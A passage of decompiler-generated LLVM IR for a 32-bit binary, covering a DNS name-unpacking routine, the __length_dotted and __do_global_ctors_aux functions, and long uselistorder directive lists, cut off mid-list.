  br i1 %v1_8050aec3046, label %dec_label_pc_8050a54.lr.ph, label %dec_label_pc_8050af2

dec_label_pc_8050a54:                             ; preds = %dec_label_pc_8050a54.lr.ph, %dec_label_pc_8050a6d
  %v0_8050a5e = phi i32 [ %v0_8050a5e.pre, %dec_label_pc_8050a54.lr.ph ], [ %v4_8050a7e, %dec_label_pc_8050a6d ]
  %v8_8050a5437 = phi i1 [ %v8_8050a543151, %dec_label_pc_8050a54.lr.ph ], [ true, %dec_label_pc_8050a6d ]
  %v5_8050ae636.in = phi i8 [ %v5_8050ae62850.in, %dec_label_pc_8050a54.lr.ph ], [ %v4_8050ae6, %dec_label_pc_8050a6d ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8050a54.lr.ph ], [ 0, %dec_label_pc_8050a6d ]
  %v0_8050a5b34 = phi i32 [ %v0_8050a5b.ph47, %dec_label_pc_8050a54.lr.ph ], [ %v2_8050a8c, %dec_label_pc_8050a6d ]
  %v5_8050ae636 = zext i8 %v5_8050ae636.in to i32
  %v1_8050a5b = add i32 %v0_8050a5b34, 1
  store i32 %v1_8050a5b, i32* @esi, align 4
  %v3_8050a5e = select i1 %v8_8050a5437, i32 2, i32 1
  %v4_8050a5e = add i32 %v3_8050a5e, %v0_8050a5e
  store i32 %v4_8050a5e, i32* %ebp.global-to-local, align 4
  %v1_8050a61 = and i32 %v5_8050ae636, 192
  %v6_8050a66 = icmp eq i32 %v1_8050a61, 192
  %v1_8050a6b = icmp eq i1 %v6_8050a66, false
  br i1 %v1_8050a6b, label %dec_label_pc_8050a90, label %dec_label_pc_8050a6d

dec_label_pc_8050a6d:                             ; preds = %dec_label_pc_8050a54
  %v2_8050a7a = add i32 %v1_8050a5b, %arg1
  %v3_8050a7a = inttoptr i32 %v2_8050a7a to i8*
  %v4_8050a7a = load i8, i8* %v3_8050a7a, align 1
  %v5_8050a7a = zext i8 %v4_8050a7a to i32
  %v4_8050a7e = add i32 %v3_8050a5e, %v4_8050a5e
  store i32 %v4_8050a7e, i32* %ebp.global-to-local, align 4
  %v1_8050a81 = mul nuw nsw i32 %v5_8050ae636, 256
  %v2_8050a84 = and i32 %v1_8050a81, 16128
  %v2_8050a8c = or i32 %v5_8050a7a, %v2_8050a84
  store i32 %v2_8050a8c, i32* @edx, align 4
  store i32 %v1_8050aad.ph48, i32* @ecx, align 4
  %v2_8050ae6 = add i32 %v2_8050a8c, %arg1
  %v3_8050ae6 = inttoptr i32 %v2_8050ae6 to i8*
  %v4_8050ae6 = load i8, i8* %v3_8050ae6, align 1
  %v1_8050aea = icmp eq i8 %v4_8050ae6, 0
  %v1_8050aec = icmp eq i1 %v1_8050aea, false
  br i1 %v1_8050aec, label %dec_label_pc_8050a54, label %dec_label_pc_8050af2

dec_label_pc_8050a90:                             ; preds = %dec_label_pc_8050a54
  %v2_8050a90 = add i32 %v5_8050ae636, %v1_8050aad.ph48
  %v1_8050a95 = add i32 %v2_8050a90, 1
  store i32 %v1_8050a95, i32* @edi, align 4
  %v10_8050a96 = icmp ult i32 %v1_8050a95, %arg4
  %v1_8050a9e = icmp eq i1 %v10_8050a96, false
  br i1 %v1_8050a9e, label %dec_label_pc_8050afe, label %dec_label_pc_8050aa0

dec_label_pc_8050aa0:                             ; preds = %dec_label_pc_8050a90
  %v2_8050aa6 = add i32 %v1_8050a5b, %arg1
  %v2_8050aad = add i32 %v1_8050aad.ph48, %arg3
  %v3_8050ab0 = inttoptr i32 %v2_8050aad to i16*
  %v4_8050ab0 = call i32 @memcpy(i16* %v3_8050ab0, i32 %v2_8050aa6, i32 %v5_8050ae636)
  %v0_8050abc = load i32, i32* %ebp.global-to-local, align 4
  %v0_8050ac5 = load i32, i32* @esi, align 4
  %v2_8050ac5 = add i32 %v0_8050ac5, %v5_8050ae636
  store i32 %v2_8050ac5, i32* @edx, align 4
  %v1_8050acc = icmp eq i1 %v8_8050a5437, false
  %v2_8050abc = select i1 %v1_8050acc, i32 %v5_8050ae636, i32 0
  %v4_8050acc = add i32 %v0_8050abc, %v2_8050abc
  store i32 %v4_8050acc, i32* %ebp.global-to-local, align 4
  %v4_8050add = add i32 %v2_8050a90, %arg3
  %v5_8050add = inttoptr i32 %v4_8050add to i8*
  store i8 46, i8* %v5_8050add, align 1
  %v0_8050ae0.pre = load i32, i32* @edi, align 4
  %v1_8050ae6.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8050ae0.pre, i32* @ecx, align 4
  %v2_8050ae625 = add i32 %v1_8050ae6.pre.pre, %arg1
  %v3_8050ae626 = inttoptr i32 %v2_8050ae625 to i8*
  %v4_8050ae627 = load i8, i8* %v3_8050ae626, align 1
  %v1_8050aea29 = icmp eq i8 %v4_8050ae627, 0
  %v1_8050aec30 = icmp eq i1 %v1_8050aea29, false
  %v8_8050a5431 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8050a5e.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8050aec30, label %dec_label_pc_8050a54.lr.ph, label %dec_label_pc_8050af2

dec_label_pc_8050a54.lr.ph:                       ; preds = %dec_label_pc_8050aa0, %dec_label_pc_8050a46
  %v0_8050a5e.pre = phi i32 [ 0, %dec_label_pc_8050a46 ], [ %v0_8050a5e.pre.pre, %dec_label_pc_8050aa0 ]
  %v8_8050a543151 = phi i1 [ false, %dec_label_pc_8050a46 ], [ %v8_8050a5431, %dec_label_pc_8050aa0 ]
  %v5_8050ae62850.in = phi i8 [ %v4_8050ae62743, %dec_label_pc_8050a46 ], [ %v4_8050ae627, %dec_label_pc_8050aa0 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8050a46 ], [ %stack_var_-17.135, %dec_label_pc_8050aa0 ]
  %v1_8050aad.ph48 = phi i32 [ 0, %dec_label_pc_8050a46 ], [ %v0_8050ae0.pre, %dec_label_pc_8050aa0 ]
  %v0_8050a5b.ph47 = phi i32 [ %arg2, %dec_label_pc_8050a46 ], [ %v1_8050ae6.pre.pre, %dec_label_pc_8050aa0 ]
  br label %dec_label_pc_8050a54

dec_label_pc_8050af2:                             ; preds = %dec_label_pc_8050aa0, %dec_label_pc_8050a6d, %dec_label_pc_8050a46
  %v0_8050af7 = phi i32 [ 0, %dec_label_pc_8050a46 ], [ %v4_8050a7e, %dec_label_pc_8050a6d ], [ %v0_8050a5e.pre.pre, %dec_label_pc_8050aa0 ]
  %v8_8050a54.lcssa = phi i1 [ false, %dec_label_pc_8050a46 ], [ true, %dec_label_pc_8050a6d ], [ %v8_8050a5431, %dec_label_pc_8050aa0 ]
  %v2_8050af9 = zext i1 %v8_8050a54.lcssa to i32
  %v3_8050af9 = add i32 %v0_8050af7, 1
  %v4_8050af9 = add i32 %v3_8050af9, %v2_8050af9
  br label %dec_label_pc_8050b01

dec_label_pc_8050afe:                             ; preds = %dec_label_pc_8050a90, %entry
  br label %dec_label_pc_8050b01

dec_label_pc_8050b01:                             ; preds = %dec_label_pc_8050af2, %dec_label_pc_8050afe
  %storemerge = phi i32 [ %v4_8050af9, %dec_label_pc_8050af2 ], [ -1, %dec_label_pc_8050afe ]
  store i32 %v0_8050a32, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050aad.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_8050ae6, { 1, 0 }
  uselistorder i32 %v2_8050a8c, { 0, 2, 1 }
  uselistorder i32 %v4_8050a7e, { 0, 2, 1 }
  uselistorder i32 %v5_8050ae636, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 5, 8, 3, 0, 7, 6, 1, 4 }
  uselistorder i8 46, { 3, 4, 2, 0, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 2, 3, 4, 5, 6, 7, 8, 15, 10, 11, 16, 17, 19, 0, 1, 9, 12, 13, 14, 18 }
  uselistorder i32* @edi, { 3, 86, 87, 21, 88, 89, 90, 20, 91, 92, 93, 94, 95, 2, 0, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 25, 5, 4, 26, 27, 28, 29, 30, 33, 31, 32, 111, 7, 112, 8, 113, 114, 6, 115, 116, 117, 118, 123, 124, 1, 119, 120, 121, 122, 125, 126, 127, 128, 210, 9, 211, 212, 213, 129, 130, 138, 139, 140, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 185, 41, 42, 43, 44, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 10, 225, 226, 227, 228, 229, 230, 231, 267, 268, 269, 11, 270, 271, 274, 275, 276, 277, 278, 45, 46, 47, 279, 280, 281, 282, 283, 284, 285, 286, 296, 297, 12, 298, 299, 300, 34, 35, 36, 37, 38, 39, 40, 48, 49, 50, 51, 52, 186, 196, 197, 198, 199, 200, 187, 188, 189, 190, 191, 192, 193, 194, 195, 53, 54, 55, 56, 57, 58, 59, 172, 173, 174, 175, 176, 177, 178, 179, 13, 180, 181, 182, 183, 184, 201, 202, 14, 203, 204, 205, 206, 207, 208, 209, 232, 233, 15, 234, 294, 295, 235, 236, 237, 16, 149, 150, 141, 142, 143, 144, 145, 146, 147, 148, 60, 61, 62, 151, 152, 153, 238, 239, 240, 241, 242, 243, 244, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 17, 259, 22, 23, 24, 245, 18, 246, 247, 290, 291, 292, 293, 154, 155, 156, 157, 158, 159, 260, 261, 262, 263, 131, 132, 133, 134, 135, 136, 137, 272, 273, 79, 80, 287, 288, 289, 63, 19, 64, 65, 66, 67, 170, 171, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 82, 83, 84, 85, 264, 265, 266 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 10, 11, 42, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 41, 23, 24, 25, 26, 27, 0, 1, 28, 2, 43, 49, 44, 29, 30, 50, 31, 32, 4, 46, 47, 3, 45, 33, 34, 35, 36, 37, 38, 39, 40, 48, 51 }
  uselistorder i32* @edx, { 1, 59, 60, 61, 62, 63, 64, 65, 66, 14, 70, 68, 69, 71, 72, 73, 74, 75, 76, 77, 17, 21, 18, 19, 20, 78, 79, 80, 81, 82, 83, 84, 91, 85, 86, 87, 88, 89, 90, 0, 15, 173, 174, 92, 175, 176, 177, 178, 179, 221, 222, 106, 93, 94, 95, 110, 111, 113, 114, 145, 2, 26, 180, 181, 96, 97, 3, 98, 99, 100, 101, 182, 183, 184, 185, 186, 187, 224, 225, 226, 227, 4, 228, 229, 231, 146, 232, 233, 147, 27, 22, 23, 234, 24, 235, 236, 237, 112, 239, 240, 242, 241, 243, 54, 244, 245, 246, 247, 248, 249, 55, 25, 150, 160, 5, 161, 162, 163, 164, 165, 166, 151, 152, 153, 154, 155, 156, 157, 6, 158, 159, 148, 149, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 7, 43, 44, 45, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 8, 140, 141, 142, 143, 144, 167, 168, 170, 171, 172, 67, 169, 51, 188, 102, 103, 104, 46, 105, 189, 190, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 13, 208, 209, 191, 210, 9, 211, 212, 214, 10, 215, 216, 217, 218, 219, 16, 11, 213, 238, 107, 108, 109, 12, 220, 230, 223, 47, 48, 57, 49, 50, 52, 53, 56, 58, 250 }
  uselistorder i32* @esi, { 111, 112, 113, 114, 115, 116, 34, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 35, 40, 41, 9, 5, 48, 42, 45, 43, 44, 6, 46, 47, 137, 10, 138, 139, 142, 140, 141, 149, 143, 144, 145, 146, 147, 148, 150, 151, 152, 153, 154, 155, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 11, 252, 253, 12, 162, 163, 165, 164, 7, 166, 167, 190, 191, 192, 193, 194, 195, 0, 36, 196, 197, 198, 199, 200, 201, 60, 61, 62, 63, 64, 322, 323, 324, 325, 218, 219, 254, 255, 256, 13, 257, 258, 259, 260, 261, 262, 263, 326, 327, 328, 329, 330, 65, 66, 67, 331, 332, 333, 334, 335, 343, 344, 345, 346, 358, 359, 360, 361, 362, 363, 364, 336, 341, 342, 49, 50, 51, 52, 53, 54, 68, 69, 70, 1, 71, 72, 73, 55, 56, 57, 58, 59, 220, 230, 14, 231, 232, 225, 226, 227, 228, 229, 221, 222, 223, 224, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 15, 213, 37, 214, 215, 216, 217, 233, 234, 235, 238, 239, 240, 241, 347, 16, 348, 349, 264, 17, 265, 38, 31, 236, 237, 102, 103, 365, 366, 356, 357, 266, 267, 268, 269, 270, 271, 272, 178, 18, 8, 168, 172, 173, 174, 175, 19, 32, 176, 177, 169, 170, 171, 89, 20, 90, 91, 179, 21, 180, 181, 273, 274, 275, 276, 23, 277, 2, 279, 280, 281, 282, 22, 283, 284, 278, 285, 286, 287, 288, 3, 289, 290, 291, 292, 293, 294, 295, 33, 24, 296, 297, 25, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 26, 315, 316, 317, 27, 39, 298, 4, 299, 300, 337, 338, 339, 340, 350, 351, 352, 353, 354, 355, 182, 183, 184, 185, 28, 186, 187, 188, 189, 318, 319, 320, 321, 156, 157, 158, 159, 29, 30, 160, 161, 104, 105, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 106, 107, 108, 109, 110, 367 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8050b01, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8050b1a = icmp eq i32 %arg1, 0
  br i1 %v1_8050b1a, label %dec_label_pc_8050b49, label %dec_label_pc_8050b3a.preheader

dec_label_pc_8050b3a.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_8050b3a10 = add i32 %arg2, %arg1
  %v3_8050b3a11 = inttoptr i32 %v2_8050b3a10 to i8*
  %v4_8050b3a12 = load i8, i8* %v3_8050b3a11, align 1
  %v1_8050b3e14 = add i32 %arg2, 1
  %v1_8050b4115 = icmp eq i8 %v4_8050b3a12, 0
  %v1_8050b4316 = icmp eq i1 %v1_8050b4115, false
  br i1 %v1_8050b4316, label %dec_label_pc_8050b29, label %dec_label_pc_8050b45

dec_label_pc_8050b20:                             ; preds = %dec_label_pc_8050b29
  %v1_8050b20 = add i32 %v0_8050b2017, 2
  br label %dec_label_pc_8050b45

dec_label_pc_8050b29:                             ; preds = %dec_label_pc_8050b3a.preheader, %dec_label_pc_8050b3a
  %v1_8050b3e19 = phi i32 [ %v1_8050b3e, %dec_label_pc_8050b3a ], [ %v1_8050b3e14, %dec_label_pc_8050b3a.preheader ]
  %v5_8050b3a18.in = phi i8 [ %v4_8050b3a, %dec_label_pc_8050b3a ], [ %v4_8050b3a12, %dec_label_pc_8050b3a.preheader ]
  %v0_8050b2017 = phi i32 [ %v2_8050b37, %dec_label_pc_8050b3a ], [ %arg2, %dec_label_pc_8050b3a.preheader ]
  %v5_8050b3a18 = zext i8 %v5_8050b3a18.in to i32
  %v1_8050b2b = and i32 %v5_8050b3a18, 192
  %v6_8050b30 = icmp eq i32 %v1_8050b2b, 192
  %v2_8050b37 = add i32 %v5_8050b3a18, %v1_8050b3e19
  br i1 %v6_8050b30, label %dec_label_pc_8050b20, label %dec_label_pc_8050b3a

dec_label_pc_8050b3a:                             ; preds = %dec_label_pc_8050b29
  store i32 %v2_8050b37, i32* @ecx, align 4
  %v2_8050b3a = add i32 %v2_8050b37, %arg1
  %v3_8050b3a = inttoptr i32 %v2_8050b3a to i8*
  %v4_8050b3a = load i8, i8* %v3_8050b3a, align 1
  %v1_8050b3e = add i32 %v2_8050b37, 1
  %v1_8050b41 = icmp eq i8 %v4_8050b3a, 0
  %v1_8050b43 = icmp eq i1 %v1_8050b41, false
  br i1 %v1_8050b43, label %dec_label_pc_8050b29, label %dec_label_pc_8050b45

dec_label_pc_8050b45:                             ; preds = %dec_label_pc_8050b3a.preheader, %dec_label_pc_8050b3a, %dec_label_pc_8050b20
  %v0_8050b45 = phi i32 [ %v1_8050b20, %dec_label_pc_8050b20 ], [ %v1_8050b3e14, %dec_label_pc_8050b3a.preheader ], [ %v1_8050b3e, %dec_label_pc_8050b3a ]
  %v2_8050b47 = sub i32 %v0_8050b45, %arg2
  br label %dec_label_pc_8050b49

dec_label_pc_8050b49:                             ; preds = %entry, %dec_label_pc_8050b45
  %v0_8050b4c = phi i32 [ -1, %entry ], [ %v2_8050b47, %dec_label_pc_8050b45 ]
  ret i32 %v0_8050b4c

; uselistorder directives
  uselistorder i8 %v4_8050b3a, { 1, 0 }
  uselistorder i32 %v2_8050b37, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 91, 35, 92, 54, 96, 97, 32, 33, 34, 0, 1, 93, 98, 99, 100, 83, 101, 102, 103, 104, 105, 106, 85, 2, 86, 87, 37, 107, 108, 3, 55, 38, 121, 122, 50, 109, 110, 111, 113, 84, 115, 116, 40, 123, 124, 51, 12, 13, 43, 44, 52, 132, 41, 82, 11, 56, 78, 57, 79, 58, 80, 39, 14, 90, 36, 59, 60, 4, 61, 5, 62, 6, 63, 64, 15, 16, 45, 17, 18, 88, 19, 20, 21, 46, 114, 22, 23, 53, 24, 65, 117, 118, 119, 120, 7, 47, 94, 95, 25, 133, 48, 8, 9, 125, 126, 42, 26, 27, 127, 28, 128, 29, 49, 129, 130, 30, 112, 131, 31, 66, 67, 69, 68, 81, 89, 70, 71, 72, 10, 73, 74, 76, 75, 77 }
  uselistorder i8 0, { 28, 3, 6, 7, 29, 5, 4, 73, 74, 75, 9, 82, 77, 78, 8, 80, 81, 79, 22, 83, 0, 1, 43, 44, 45, 84, 85, 24, 86, 10, 12, 47, 46, 11, 30, 87, 88, 89, 125, 126, 15, 97, 93, 94, 92, 13, 95, 96, 14, 23, 98, 99, 108, 109, 110, 111, 112, 120, 121, 17, 49, 48, 16, 50, 51, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 2, 143, 144, 145, 183, 146, 186, 31, 39, 26, 27, 68, 18, 185, 122, 123, 52, 113, 114, 115, 116, 117, 118, 32, 119, 76, 147, 148, 40, 149, 124, 58, 187, 103, 104, 100, 102, 101, 150, 151, 152, 153, 154, 155, 156, 157, 158, 19, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 21, 172, 173, 174, 175, 176, 177, 178, 179, 41, 184, 105, 106, 107, 180, 90, 91, 55, 53, 54, 56, 57, 59, 60, 61, 63, 62, 20, 64, 65, 66, 67, 69, 70, 71, 72, 181, 182, 25, 42, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* @ecx, { 25, 5, 7, 24, 6, 52, 53, 12, 54, 55, 56, 57, 13, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 35, 42, 36, 37, 38, 39, 40, 41, 74, 75, 76, 8, 9, 43, 1, 141, 200, 11, 16, 77, 78, 14, 10, 15, 79, 84, 85, 86, 87, 88, 111, 112, 113, 114, 2, 44, 142, 143, 29, 144, 81, 82, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 26, 170, 171, 172, 173, 27, 174, 23, 201, 202, 203, 204, 17, 46, 47, 48, 49, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 18, 129, 115, 116, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 19, 104, 105, 107, 108, 109, 110, 106, 140, 0, 30, 31, 80, 175, 176, 177, 178, 179, 180, 181, 28, 182, 183, 184, 185, 186, 187, 20, 21, 3, 4, 188, 189, 22, 190, 191, 192, 193, 194, 196, 197, 198, 199, 33, 34, 195, 205, 83, 45, 32, 50, 51 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050b49, { 1, 0 }
  uselistorder label %dec_label_pc_8050b45, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050b29, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8050b5c = load i32, i32* @global_var_8053000.378, align 4096
  %v10_8050b61 = icmp eq i32 %v0_8050b5c, -1
  br i1 %v10_8050b61, label %dec_label_pc_8050b7c, label %dec_label_pc_8050b70.preheader

dec_label_pc_8050b70.preheader:                   ; preds = %entry
  br label %dec_label_pc_8050b70

dec_label_pc_8050b70:                             ; preds = %dec_label_pc_8050b70.preheader, %dec_label_pc_8050b70
  %v4_8050b73 = phi i32 [ %v0_8050b5c, %dec_label_pc_8050b70.preheader ], [ %v2_8050b75, %dec_label_pc_8050b70 ]
  %v0_8050b70 = phi i32 [ ptrtoint (i32* @global_var_8053000.378 to i32), %dec_label_pc_8050b70.preheader ], [ %v1_8050b70, %dec_label_pc_8050b70 ]
  %v1_8050b70 = add i32 %v0_8050b70, -4
  call void @__pseudo_call(i32 %v4_8050b73)
  %v1_8050b75 = inttoptr i32 %v1_8050b70 to i32*
  %v2_8050b75 = load i32, i32* %v1_8050b75, align 4
  %v10_8050b77 = icmp eq i32 %v2_8050b75, -1
  %v1_8050b7a = icmp eq i1 %v10_8050b77, false
  br i1 %v1_8050b7a, label %dec_label_pc_8050b70, label %dec_label_pc_8050b7c.loopexit

dec_label_pc_8050b7c.loopexit:                    ; preds = %dec_label_pc_8050b70
  %v2_8050b7c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8050b7c

dec_label_pc_8050b7c:                             ; preds = %dec_label_pc_8050b7c.loopexit, %entry
  %v2_8050b7c = phi i32 [ %v2_8050b7c.pre, %dec_label_pc_8050b7c.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8050b7c

; uselistorder directives
  uselistorder i32 %v0_8050b5c, { 1, 0 }
  uselistorder i1 false, { 428, 182, 4, 2, 3, 6, 183, 184, 186, 185, 5, 188, 187, 189, 198, 22, 23, 193, 197, 195, 196, 33, 190, 191, 194, 199, 200, 201, 202, 203, 69, 71, 72, 73, 74, 70, 75, 76, 79, 29, 77, 30, 78, 204, 205, 210, 24, 206, 207, 209, 208, 211, 212, 217, 216, 213, 214, 215, 7, 0, 8, 81, 82, 83, 34, 218, 219, 220, 221, 222, 223, 314, 315, 316, 224, 25, 225, 317, 318, 319, 226, 429, 430, 233, 26, 9, 228, 229, 230, 231, 232, 248, 249, 27, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 285, 286, 288, 287, 10, 84, 85, 86, 87, 320, 321, 322, 289, 290, 241, 242, 243, 323, 324, 325, 326, 327, 328, 329, 43, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 431, 432, 31, 1, 356, 35, 47, 357, 358, 291, 292, 293, 433, 445, 446, 447, 448, 451, 36, 452, 453, 450, 444, 434, 65, 454, 455, 456, 457, 458, 459, 460, 461, 48, 161, 162, 163, 164, 165, 166, 11, 462, 463, 32, 88, 12, 175, 176, 80, 437, 438, 439, 440, 441, 442, 443, 301, 302, 303, 304, 305, 306, 295, 296, 297, 298, 299, 300, 294, 89, 90, 91, 92, 93, 94, 95, 96, 97, 268, 269, 270, 271, 272, 273, 274, 275, 276, 20, 278, 277, 282, 279, 280, 281, 13, 283, 284, 307, 308, 310, 311, 449, 192, 359, 360, 37, 361, 14, 309, 129, 464, 362, 246, 244, 245, 15, 28, 234, 239, 238, 38, 240, 236, 235, 39, 237, 98, 247, 99, 44, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 383, 382, 384, 385, 386, 387, 388, 390, 21, 391, 389, 392, 394, 393, 16, 395, 396, 398, 397, 40, 399, 400, 401, 402, 403, 49, 404, 405, 57, 58, 406, 59, 60, 407, 408, 61, 409, 410, 50, 62, 411, 412, 413, 414, 415, 51, 416, 52, 63, 53, 417, 54, 418, 419, 420, 55, 421, 56, 422, 64, 423, 424, 425, 66, 67, 435, 41, 436, 17, 250, 251, 252, 253, 254, 255, 227, 100, 101, 102, 103, 104, 105, 114, 106, 18, 107, 108, 109, 110, 111, 112, 113, 45, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 146, 143, 144, 145, 19, 148, 147, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 167, 168, 169, 170, 171, 46, 172, 173, 174, 177, 178, 179, 180, 181, 312, 313, 426, 427, 68, 42, 465, 466, 467 }
  uselistorder void (i32)* @__pseudo_call, { 4, 3, 6, 7, 8, 9, 5, 1, 2, 0 }
  uselistorder i32 -4, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 56, 19, 33, 34, 35, 36, 50, 52, 53, 54, 4, 51, 0, 49, 20, 37, 2, 38, 39, 40, 5, 43, 44, 45, 46, 47, 48, 6, 55, 57, 58, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 41, 1, 42 }
  uselistorder i32 ptrtoint (i32* @global_var_8053000.378 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 54, 45, 149, 160, 161, 274, 55, 162, 56, 163, 275, 57, 58, 164, 59, 2, 3, 148, 270, 165, 4, 5, 6, 62, 61, 60, 166, 114, 115, 41, 40, 39, 167, 168, 63, 169, 30, 276, 170, 277, 278, 171, 172, 279, 150, 64, 173, 295, 174, 175, 176, 65, 177, 7, 178, 179, 180, 181, 151, 182, 8, 183, 282, 283, 10, 11, 284, 285, 135, 184, 136, 137, 127, 129, 130, 131, 132, 133, 134, 128, 31, 126, 116, 123, 185, 124, 125, 138, 139, 122, 140, 141, 142, 143, 144, 145, 146, 117, 121, 9, 187, 186, 52, 32, 188, 189, 288, 289, 12, 37, 66, 190, 48, 191, 296, 192, 118, 67, 68, 193, 69, 194, 152, 195, 196, 49, 197, 147, 198, 44, 199, 200, 201, 71, 70, 202, 203, 46, 204, 72, 73, 74, 205, 50, 51, 206, 75, 76, 207, 77, 208, 78, 209, 79, 210, 80, 211, 81, 212, 82, 213, 83, 214, 84, 215, 85, 216, 86, 217, 87, 218, 88, 219, 89, 220, 90, 221, 13, 222, 53, 91, 92, 223, 224, 225, 226, 227, 228, 94, 93, 153, 95, 14, 96, 229, 97, 230, 42, 231, 98, 232, 233, 301, 234, 235, 15, 290, 16, 236, 286, 19, 18, 20, 21, 22, 99, 23, 100, 24, 237, 17, 287, 33, 291, 294, 101, 238, 297, 239, 240, 292, 293, 241, 272, 273, 303, 304, 242, 302, 102, 243, 43, 244, 245, 246, 47, 247, 35, 298, 299, 36, 248, 249, 300, 250, 103, 251, 252, 253, 158, 159, 254, 34, 119, 120, 104, 154, 280, 281, 105, 255, 106, 256, 107, 257, 108, 258, 109, 259, 110, 260, 111, 261, 112, 262, 113, 263, 264, 265, 25, 271, 156, 155, 26, 27, 28, 38, 266, 267, 268, 269, 29, 157 }
  uselistorder i32 1, { 368, 706, 229, 621, 707, 223, 708, 73, 709, 239, 710, 711, 12, 238, 712, 369, 167, 371, 370, 96, 240, 241, 713, 230, 224, 716, 329, 717, 718, 719, 296, 720, 0, 356, 89, 88, 721, 722, 373, 372, 173, 172, 174, 723, 374, 724, 375, 175, 725, 726, 376, 177, 176, 178, 629, 630, 631, 632, 633, 634, 635, 636, 637, 380, 379, 378, 358, 377, 357, 25, 24, 23, 26, 638, 639, 383, 382, 381, 359, 360, 111, 107, 109, 106, 108, 110, 270, 727, 728, 219, 355, 729, 730, 242, 731, 297, 732, 733, 384, 94, 271, 737, 734, 735, 736, 231, 387, 386, 385, 171, 170, 738, 388, 90, 640, 641, 642, 243, 643, 739, 740, 741, 389, 180, 179, 181, 182, 298, 742, 11, 743, 390, 85, 244, 245, 17, 19, 18, 20, 246, 391, 91, 272, 1, 393, 392, 92, 93, 394, 183, 395, 84, 273, 274, 396, 275, 276, 247, 400, 399, 398, 397, 74, 300, 401, 220, 747, 748, 225, 749, 248, 232, 750, 751, 752, 753, 754, 755, 756, 249, 404, 403, 402, 772, 773, 774, 775, 776, 777, 778, 779, 2, 780, 250, 781, 782, 783, 251, 784, 785, 252, 786, 787, 788, 789, 790, 301, 366, 406, 405, 61, 60, 62, 277, 278, 814, 815, 816, 817, 233, 644, 645, 646, 407, 87, 408, 833, 409, 71, 72, 279, 757, 361, 184, 303, 834, 835, 836, 253, 302, 410, 837, 838, 839, 254, 840, 841, 422, 421, 420, 419, 418, 417, 416, 415, 414, 413, 412, 411, 193, 194, 190, 186, 191, 185, 187, 189, 188, 192, 842, 843, 3, 68, 67, 66, 65, 64, 423, 195, 196, 424, 44, 43, 844, 845, 425, 156, 155, 157, 